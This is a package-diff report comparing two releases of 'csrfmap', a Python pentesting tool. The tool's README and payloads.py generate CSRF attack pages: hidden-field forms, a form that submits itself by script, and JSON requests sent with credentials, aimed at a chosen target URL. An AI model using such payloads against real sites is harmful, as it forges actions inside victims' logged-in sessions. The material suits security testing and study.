# Comparing `tmp/csrfmap-0.0.1.tar.gz` & `tmp/csrfmap-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "csrfmap-0.0.1.tar", last modified: Sun Mar 12 23:43:13 2023, max compression
+gzip compressed data, was "csrfmap-0.0.2.tar", last modified: Fri May 26 00:40:43 2023, max compression
```

## Comparing `csrfmap-0.0.1.tar` & `csrfmap-0.0.2.tar`

### file list

```diff
@@ -1,19 +1,21 @@
-drwxrwxrwx   0        0        0        0 2023-03-12 23:43:13.599535 csrfmap-0.0.1/
--rw-rw-rw-   0        0        0     1097 2023-03-12 23:27:49.000000 csrfmap-0.0.1/LICENSE
--rw-rw-rw-   0        0        0     4195 2023-03-12 23:43:13.598080 csrfmap-0.0.1/PKG-INFO
--rw-rw-rw-   0        0        0     2852 2023-03-12 23:40:12.000000 csrfmap-0.0.1/README.md
-drwxrwxrwx   0        0        0        0 2023-03-12 23:43:13.592785 csrfmap-0.0.1/csrfmap/
--rw-rw-rw-   0        0        0       47 2023-03-12 23:32:24.000000 csrfmap-0.0.1/csrfmap/__init__.py
--rw-rw-rw-   0        0        0      128 2023-03-12 23:32:09.000000 csrfmap-0.0.1/csrfmap/__main__.py
--rw-rw-rw-   0        0        0      339 2023-03-12 23:37:53.000000 csrfmap-0.0.1/csrfmap/__meta__.py
--rw-rw-rw-   0        0        0     3333 2023-03-12 23:36:11.000000 csrfmap-0.0.1/csrfmap/csrfmap.py
--rw-rw-rw-   0        0        0     5113 2023-03-12 23:34:39.000000 csrfmap-0.0.1/csrfmap/payloads.py
-drwxrwxrwx   0        0        0        0 2023-03-12 23:43:13.598080 csrfmap-0.0.1/csrfmap.egg-info/
--rw-rw-rw-   0        0        0     4195 2023-03-12 23:43:13.000000 csrfmap-0.0.1/csrfmap.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      313 2023-03-12 23:43:13.000000 csrfmap-0.0.1/csrfmap.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-03-12 23:43:13.000000 csrfmap-0.0.1/csrfmap.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       55 2023-03-12 23:43:13.000000 csrfmap-0.0.1/csrfmap.egg-info/entry_points.txt
--rw-rw-rw-   0        0        0        2 2023-03-12 23:43:13.000000 csrfmap-0.0.1/csrfmap.egg-info/not-zip-safe
--rw-rw-rw-   0        0        0        8 2023-03-12 23:43:13.000000 csrfmap-0.0.1/csrfmap.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-03-12 23:43:13.599535 csrfmap-0.0.1/setup.cfg
--rw-rw-rw-   0        0        0     1868 2023-03-12 23:38:14.000000 csrfmap-0.0.1/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:40:43.845135 csrfmap-0.0.2/
+-rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-26 00:40:29.000000 csrfmap-0.0.2/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     4076 2023-05-26 00:40:43.845135 csrfmap-0.0.2/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     2765 2023-05-26 00:40:29.000000 csrfmap-0.0.2/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:40:43.845135 csrfmap-0.0.2/csrfmap/
+-rw-r--r--   0 runner    (1001) docker     (123)       46 2023-05-26 00:40:29.000000 csrfmap-0.0.2/csrfmap/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      123 2023-05-26 00:40:29.000000 csrfmap-0.0.2/csrfmap/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      332 2023-05-26 00:40:29.000000 csrfmap-0.0.2/csrfmap/__meta__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3272 2023-05-26 00:40:29.000000 csrfmap-0.0.2/csrfmap/csrfmap.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4987 2023-05-26 00:40:29.000000 csrfmap-0.0.2/csrfmap/payloads.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:40:43.845135 csrfmap-0.0.2/csrfmap.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     4076 2023-05-26 00:40:43.000000 csrfmap-0.0.2/csrfmap.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      330 2023-05-26 00:40:43.000000 csrfmap-0.0.2/csrfmap.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 00:40:43.000000 csrfmap-0.0.2/csrfmap.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       55 2023-05-26 00:40:43.000000 csrfmap-0.0.2/csrfmap.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 00:40:43.000000 csrfmap-0.0.2/csrfmap.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       13 2023-05-26 00:40:43.000000 csrfmap-0.0.2/csrfmap.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-26 00:40:43.845135 csrfmap-0.0.2/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     1817 2023-05-26 00:40:29.000000 csrfmap-0.0.2/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:40:43.845135 csrfmap-0.0.2/test/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-26 00:40:29.000000 csrfmap-0.0.2/test/__init__.py
```

### Comparing `csrfmap-0.0.1/LICENSE` & `csrfmap-0.0.2/LICENSE`

 * *Ordering differences only*

 * *Files 16% similar despite different names*

```diff
@@ -1,20 +1,20 @@
-The MIT License (MIT)
-
-Copyright (c) 2023 João Victor
-
-Permission is hereby granted, free of charge, to any person obtaining a copy of
-this software and associated documentation files (the "Software"), to deal in
-the Software without restriction, including without limitation the rights to
-use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
-the Software, and to permit persons to whom the Software is furnished to do so,
-subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
-FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
-COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
-IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
+The MIT License (MIT)
+
+Copyright (c) 2023 João Victor
+
+Permission is hereby granted, free of charge, to any person obtaining a copy of
+this software and associated documentation files (the "Software"), to deal in
+the Software without restriction, including without limitation the rights to
+use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
+the Software, and to permit persons to whom the Software is furnished to do so,
+subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
+FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
+COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
+IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```

### Comparing `csrfmap-0.0.1/PKG-INFO` & `csrfmap-0.0.2/PKG-INFO`

 * *Files 12% similar despite different names*

```diff
@@ -1,119 +1,119 @@
-Metadata-Version: 2.1
-Name: csrfmap
-Version: 0.0.1
-Summary: Tool to generate payloads focused on CSRF
-Home-page: https://github.com/joaoviictorti/csrfmap
-Author: joaoviictorti (viictorjj)
-Author-email: joaovictorti08@gmail.com
-License: MIT License
-Keywords: CSRF requests python security
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: Environment :: Console
-Classifier: Intended Audience :: System Administrators
-Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
-Classifier: Natural Language :: English
-Classifier: Operating System :: OS Independent
-Classifier: Programming Language :: Python
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Classifier: Programming Language :: Python :: 3 :: Only
-Classifier: Programming Language :: Python :: Implementation :: PyPy
-Classifier: Topic :: Security
-Classifier: Topic :: System :: Networking
-Classifier: Topic :: System :: Operating System
-Classifier: Topic :: System :: Systems Administration
-Classifier: Topic :: Utilities
-Requires-Python: >=3.6, <4
-Description-Content-Type: text/markdown
-License-File: LICENSE
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=csrfmap)](https://git.io/typing-svg)
-
-
-
-<h4 align="center"> Tool to generate payloads focused on CSRF </h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-revshell">Usage</a>
-</p>
-
----
-
-
-O csrfmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.
-
-Projetei o `csrfmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.
-
-# Forma de utilização
-
-```sh
-csrfmap -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
- _____ _____ _____ _____ _____ _____ _____ 
-|     |   __| __  |   __|     |  _  |  _  |
-|   --|__   |    -|   __| | | |     |   __|
-|_____|_____|__|__|__|  |_|_|_|__|__|__|   
-                                                       
-                        v0.0.1 - @joaoviictorti 
-
-options:
-  -h, --help            show this help message and exit
-  -a ACTION, -A ACTION  Insert action
-  -m METHOD, -M METHOD  Insert method
-  -p {form1,form2,json1,json2}
-  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
-  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
-
-```
-
-# Instalação
-
-csrfmap requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install csrfmap
-```
-
-# Executando csrfmap
-
-```console
-csrfmap -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542
-
- _____ _____ _____ _____ _____ _____ _____ 
-|     |   __| __  |   __|     |  _  |  _  |
-|   --|__   |    -|   __| | | |     |   __|
-|_____|_____|__|__|__|  |_|_|_|__|__|__|   
-                                                       
-                        v0.0.1 - @joaoviictorti   
-
-csrf.html:
-<!DOCTYPE html>
-<html lang="pt-br">
-<body>
-	<form action="http://exemplo.com" method="post">
-	<input name="username" value="victor" type="hidden"/>
-	<input name="password" value="password" type="hidden"/>
-	<input name="token" value="132423542" type="hidden"/>
-	<input type="submit">Enviar</input>
-	</form>
-</body>
-</html>
-
-```
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+Metadata-Version: 2.1
+Name: csrfmap
+Version: 0.0.2
+Summary: Tool to generate payloads focused on CSRF
+Home-page: https://github.com/joaoviictorti/csrfmap
+Author: joaoviictorti (viictorjj)
+Author-email: joaovictorti08@gmail.com
+License: MIT License
+Keywords: CSRF requests python security
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: Environment :: Console
+Classifier: Intended Audience :: System Administrators
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Natural Language :: English
+Classifier: Operating System :: OS Independent
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Classifier: Programming Language :: Python :: 3 :: Only
+Classifier: Programming Language :: Python :: Implementation :: PyPy
+Classifier: Topic :: Security
+Classifier: Topic :: System :: Networking
+Classifier: Topic :: System :: Operating System
+Classifier: Topic :: System :: Systems Administration
+Classifier: Topic :: Utilities
+Requires-Python: >=3.6, <4
+Description-Content-Type: text/markdown
+License-File: LICENSE
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=csrfmap)](https://git.io/typing-svg)
+
+
+
+<h4 align="center"> Tool to generate payloads focused on CSRF </h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-revshell">Usage</a>
+</p>
+
+---
+
+
+O csrfmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.
+
+Projetei o `csrfmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.
+
+# Forma de utilização
+
+```sh
+csrfmap -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+ _____ _____ _____ _____ _____ _____ _____ 
+|     |   __| __  |   __|     |  _  |  _  |
+|   --|__   |    -|   __| | | |     |   __|
+|_____|_____|__|__|__|  |_|_|_|__|__|__|   
+                                                       
+                        v0.0.2 - @joaoviictorti 
+
+options:
+  -h, --help            show this help message and exit
+  -a ACTION, -A ACTION  Insert action
+  -m METHOD, -M METHOD  Insert method
+  -p {form1,form2,json1,json2}
+  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
+  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
+
+```
+
+# Instalação
+
+csrfmap requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install csrfmap
+```
+
+# Executando csrfmap
+
+```console
+csrfmap -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542
+
+ _____ _____ _____ _____ _____ _____ _____ 
+|     |   __| __  |   __|     |  _  |  _  |
+|   --|__   |    -|   __| | | |     |   __|
+|_____|_____|__|__|__|  |_|_|_|__|__|__|   
+                                                       
+                        v0.0.2 - @joaoviictorti   
+
+csrf.html:
+<!DOCTYPE html>
+<html lang="pt-br">
+<body>
+	<form action="http://exemplo.com" method="post">
+	<input name="username" value="victor" type="hidden"/>
+	<input name="password" value="password" type="hidden"/>
+	<input name="token" value="132423542" type="hidden"/>
+	<input type="submit">Enviar</input>
+	</form>
+</body>
+</html>
+
+```
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: csrfmap Version: 0.0.1 Summary: Tool to generate
+Metadata-Version: 2.1 Name: csrfmap Version: 0.0.2 Summary: Tool to generate
 payloads focused on CSRF Home-page: https://github.com/joaoviictorti/csrfmap
 Author: joaoviictorti (viictorjj) Author-email: joaovictorti08@gmail.com
 License: MIT License Keywords: CSRF requests python security Classifier:
 Development Status :: 5 - Production/Stable Classifier: Environment :: Console
 Classifier: Intended Audience :: System Administrators Classifier: License ::
 OSI Approved :: GNU General Public License v3 (GPLv3) Classifier: Natural
 Language :: English Classifier: Operating System :: OS Independent Classifier:
@@ -28,20 +28,20 @@
 para tornÃ¡-lo Ãºtil para testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera
 payloads CSRF com foco em exploraÃ§Ã£o de falsificaÃ§Ã£o de requisiÃ§Ãµes entre
 sites. # Forma de utilizaÃ§Ã£o ```sh csrfmap -a "http://exemplo.com" -m post -
 t forminteraction -n username password token -v victor password 132423542 ```
 Isso exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
 suporta: ```yaml _____ _____ _____ _____ _____ _____ _____ | | __| __ | __| | _
 | _ | | --|__ | -| __| | | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__|
-v0.0.1 - @joaoviictorti options: -h, --help show this help message and exit -
+v0.0.2 - @joaoviictorti options: -h, --help show this help message and exit -
 a ACTION, -A ACTION Insert action -m METHOD, -M METHOD Insert method -p
 {form1,form2,json1,json2} -n NAME [NAME ...], -name NAME [NAME ...] Insert name
 -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values ``` # InstalaÃ§Ã£o
 csrfmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install
 csrfmap ``` # Executando csrfmap ```console csrfmap -a "http://exemplo.com" -
 m post -p form1 -n username password token -v victor password 132423542 _____
 _____ _____ _____ _____ _____ _____ | | __| __ | __| | _ | _ | | --|__ | -| __|
-| | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__| v0.0.1 - @joaoviictorti
+| | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__| v0.0.2 - @joaoviictorti
 csrf.html:
    [Submit]Enviar
 ``` [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `csrfmap-0.0.1/README.md` & `csrfmap-0.0.2/README.md`

 * *Files 12% similar despite different names*

```diff
@@ -1,87 +1,87 @@
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
-
-[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=csrfmap)](https://git.io/typing-svg)
-
-
-
-<h4 align="center"> Tool to generate payloads focused on CSRF </h4>
-
-
-<p align="center">
-  <a href="#características">Features</a> •
-  <a href="#instalação">Install</a> •
-  <a href="#forma-de-utilização">How to use</a> •
-  <a href="#executando-revshell">Usage</a>
-</p>
-
----
-
-
-O csrfmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.
-
-Projetei o `csrfmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
-
-# Características
-
- - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.
-
-# Forma de utilização
-
-```sh
-csrfmap -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
-```
-Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
-```yaml
- _____ _____ _____ _____ _____ _____ _____ 
-|     |   __| __  |   __|     |  _  |  _  |
-|   --|__   |    -|   __| | | |     |   __|
-|_____|_____|__|__|__|  |_|_|_|__|__|__|   
-                                                       
-                        v0.0.1 - @joaoviictorti 
-
-options:
-  -h, --help            show this help message and exit
-  -a ACTION, -A ACTION  Insert action
-  -m METHOD, -M METHOD  Insert method
-  -p {form1,form2,json1,json2}
-  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
-  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
-
-```
-
-# Instalação
-
-csrfmap requer **python3** e para baixá-lo só usar:
-
-```sh
-pip3 install csrfmap
-```
-
-# Executando csrfmap
-
-```console
-csrfmap -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542
-
- _____ _____ _____ _____ _____ _____ _____ 
-|     |   __| __  |   __|     |  _  |  _  |
-|   --|__   |    -|   __| | | |     |   __|
-|_____|_____|__|__|__|  |_|_|_|__|__|__|   
-                                                       
-                        v0.0.1 - @joaoviictorti   
-
-csrf.html:
-<!DOCTYPE html>
-<html lang="pt-br">
-<body>
-	<form action="http://exemplo.com" method="post">
-	<input name="username" value="victor" type="hidden"/>
-	<input name="password" value="password" type="hidden"/>
-	<input name="token" value="132423542" type="hidden"/>
-	<input type="submit">Enviar</input>
-	</form>
-</body>
-</html>
-
-```
-
-<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=header"/>
+
+[![Typing SVG](https://readme-typing-svg.herokuapp.com/?color=0000FF&size=32&center=true&vCenter=true&width=1000&height=30&lines=csrfmap)](https://git.io/typing-svg)
+
+
+
+<h4 align="center"> Tool to generate payloads focused on CSRF </h4>
+
+
+<p align="center">
+  <a href="#características">Features</a> •
+  <a href="#instalação">Install</a> •
+  <a href="#forma-de-utilização">How to use</a> •
+  <a href="#executando-revshell">Usage</a>
+</p>
+
+---
+
+
+O csrfmap é uma ferramenta que gera payloads de Cross-site request forgery. Possui uma funcionalidade que gera diversas possibilidades de exploração.
+
+Projetei o `csrfmap`  e mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads CSRF com foco em exploração de falsificação de requisições entre sites.
+
+# Forma de utilização
+
+```sh
+csrfmap -a "http://exemplo.com" -m post -t forminteraction -n username password token -v victor password 132423542
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+ _____ _____ _____ _____ _____ _____ _____ 
+|     |   __| __  |   __|     |  _  |  _  |
+|   --|__   |    -|   __| | | |     |   __|
+|_____|_____|__|__|__|  |_|_|_|__|__|__|   
+                                                       
+                        v0.0.2 - @joaoviictorti 
+
+options:
+  -h, --help            show this help message and exit
+  -a ACTION, -A ACTION  Insert action
+  -m METHOD, -M METHOD  Insert method
+  -p {form1,form2,json1,json2}
+  -n NAME [NAME ...], -name NAME [NAME ...] Insert name
+  -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values
+
+```
+
+# Instalação
+
+csrfmap requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install csrfmap
+```
+
+# Executando csrfmap
+
+```console
+csrfmap -a "http://exemplo.com" -m post -p form1 -n username password token -v victor password 132423542
+
+ _____ _____ _____ _____ _____ _____ _____ 
+|     |   __| __  |   __|     |  _  |  _  |
+|   --|__   |    -|   __| | | |     |   __|
+|_____|_____|__|__|__|  |_|_|_|__|__|__|   
+                                                       
+                        v0.0.2 - @joaoviictorti   
+
+csrf.html:
+<!DOCTYPE html>
+<html lang="pt-br">
+<body>
+	<form action="http://exemplo.com" method="post">
+	<input name="username" value="victor" type="hidden"/>
+	<input name="password" value="password" type="hidden"/>
+	<input name="token" value="132423542" type="hidden"/>
+	<input type="submit">Enviar</input>
+	</form>
+</body>
+</html>
+
+```
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -11,20 +11,20 @@
 para tornÃ¡-lo Ãºtil para testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera
 payloads CSRF com foco em exploraÃ§Ã£o de falsificaÃ§Ã£o de requisiÃ§Ãµes entre
 sites. # Forma de utilizaÃ§Ã£o ```sh csrfmap -a "http://exemplo.com" -m post -
 t forminteraction -n username password token -v victor password 132423542 ```
 Isso exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
 suporta: ```yaml _____ _____ _____ _____ _____ _____ _____ | | __| __ | __| | _
 | _ | | --|__ | -| __| | | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__|
-v0.0.1 - @joaoviictorti options: -h, --help show this help message and exit -
+v0.0.2 - @joaoviictorti options: -h, --help show this help message and exit -
 a ACTION, -A ACTION Insert action -m METHOD, -M METHOD Insert method -p
 {form1,form2,json1,json2} -n NAME [NAME ...], -name NAME [NAME ...] Insert name
 -v VALUE [VALUE ...], -value VALUE [VALUE ...] Insert values ``` # InstalaÃ§Ã£o
 csrfmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install
 csrfmap ``` # Executando csrfmap ```console csrfmap -a "http://exemplo.com" -
 m post -p form1 -n username password token -v victor password 132423542 _____
 _____ _____ _____ _____ _____ _____ | | __| __ | __| | _ | _ | | --|__ | -| __|
-| | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__| v0.0.1 - @joaoviictorti
+| | | | __| |_____|_____|__|__|__| |_|_|_|__|__|__| v0.0.2 - @joaoviictorti
 csrf.html:
    [Submit]Enviar
 ``` [https://capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `csrfmap-0.0.1/csrfmap/payloads.py` & `csrfmap-0.0.2/csrfmap/payloads.py`

 * *Ordering differences only*

 * *Files 19% similar despite different names*

```diff
@@ -1,127 +1,127 @@
-import os
-
-class CSRF():
-
-    def __init__(self:object,action:str=0,method:str=0,name:list=0,values:list="__valor__"):
-        self.__action = action
-        self.__method = method
-        self.__name = name
-        self.__value = values
-        self.__error = "Error, name and value with different numbers of arguments"
-
-    @property
-    def Error(self:object):
-        return self.__error
-    
-    def CSRFUserInteraction(self:object):
-        dicionario = {}
-        for name,value in enumerate(self.__name):
-            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"
-
-        lista = ["<!DOCTYPE html>\r\n",
-            "<html lang=\"pt-br\">\r\n",
-            "<body>\r\n",
-            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
-            "\t</form>\r\n"
-            "</body>\r\n"]  
-
-        if "csrf.html" in os.listdir():
-            if "Linux" in list(os.uname()):
-                os.system("rm -f csrf.html")
-            elif "Windows" in list(os.uname()):
-                os.system("del csrf.html")
-
-        with open("./csrf.html","a") as arquivo:
-            for tag in lista:
-                arquivo.write(tag)
-                if "method" in tag:
-                    for input in dicionario:
-                        arquivo.write(dicionario[input])
-                    arquivo.write("\t<input type=\"submit\">Enviar</input>\r\n")
-            arquivo.write("</html>\r\n")
-
-    def CSRFNoUserInteraction(self:object):
-        dicionario = {}
-        for name,value in enumerate(self.__name):
-            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"
-
-        lista = ["<!DOCTYPE html>\r\n",
-            "<html lang=\"pt-br\">\r\n",
-            "<body>\r\n",
-            f"\t<form action=\"{self.__action}\" method=\"{self.__method}\">\r\n",
-            "\t</form>\r\n"
-            "</body>\r\n"]
-
-        if "csrf_nouser.html" in os.listdir():
-            if "Linux" in list(os.uname()):
-                os.system("rm -f csrf_nouser.html")
-            elif "Windows" in list(os.uname()):
-                os.system("del csrf_nouser.html")
-
-        with open("./csrf_nouser.html","a") as arquivo:
-            for tag in lista:
-                arquivo.write(tag)
-                if "method" in tag:
-                    for input in dicionario:
-                        arquivo.write(dicionario[input])
-                    arquivo.write("\t<script> document.forms[0].submit();</script>\r\n")
-            arquivo.write("</html>\r\n")
-
-    def CSRFJson(self:object):
-        dicionario = {}
-        for name,value in enumerate(self.__name):
-            dicionario[self.__name[name]] = self.__value[name]
-        
-        lista = ["<!DOCTYPE html>\r\n",
-            "<html lang=\"pt-br\">\r\n",
-            "<body>\r\n",
-            "\t<script>\r\n",
-            "\tvar csrf = XMLHttpRequest();\r\n",
-            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
-            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n"
-            ]
-
-        if "csrfjson1.html" in os.listdir():
-            if "Linux" in list(os.uname()):
-                os.system("rm -f csrfjson1.html")
-            elif "Windows" in list(os.uname()):
-                os.system("del csrfjson1.html")    
-
-        with open("./csrfjson1.html","a") as arquivo:
-            for tag in lista:
-                arquivo.write(tag)
-                if "setRequestHeader" in tag:
-                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
-                    arquivo.write(f"\t</script>\r\n")
-                    arquivo.write(f"</body>\r\n")
-                    arquivo.write(f"</html>")
-
-    def CSRFJsonCredentials(self:object):
-        dicionario = {}
-        for name,value in enumerate(self.__name):
-            dicionario[self.__name[name]] = self.__value[name]
-        
-        lista = ["<!DOCTYPE html>\r\n",
-            "<html lang=\"pt-br\">\r\n",
-            "<body>\r\n",
-            "\t<script>\r\n",
-            "\tvar csrf = XMLHttpRequest();\r\n",
-            f"\tcsrf.open(\"{self.__method}\",\"{self.__action}\");\r\n",
-            "\tcsrf.setRequestHeader(\"Content-Type\",\"application/json\");\r\n",
-            "\tcsrf.withCredentials = true;\r\n"
-            ]
-
-        if "csrfjson2.html" in os.listdir():
-            if "Linux" in list(os.uname()):
-                os.system("rm -f csrfjson2.html")
-            elif "Windows" in list(os.uname()):
-                os.system("del csrfjson2.html")      
-
-        with open("./csrfjson2.html","a") as arquivo:
-            for tag in lista:
-                arquivo.write(tag)
-                if "withCredentials" in tag:
-                    arquivo.write(f"\tcsrf.send({dicionario});\r\n")
-                    arquivo.write(f"\t</script>\r\n")
-                    arquivo.write(f"</body>\r\n")
+import os
+
+class CSRF():
+
+    def __init__(self:object,action:str=0,method:str=0,name:list=0,values:list="__valor__"):
+        self.__action = action
+        self.__method = method
+        self.__name = name
+        self.__value = values
+        self.__error = "Error, name and value with different numbers of arguments"
+
+    @property
+    def Error(self:object):
+        return self.__error
+    
+    def CSRFUserInteraction(self:object):
+        dicionario = {}
+        for name,value in enumerate(self.__name):
+            dicionario[self.__name[name]] = f"\t<input name=\"{value}\" value=\"{self.__value[name]}\" type=\"hidden\"/>\r\n"
+
+        lista = ["<!DOCTYPE html>\r\n",
+            "<html lang=\"pt-br\">\r\n",
+            "<body>\r\n",
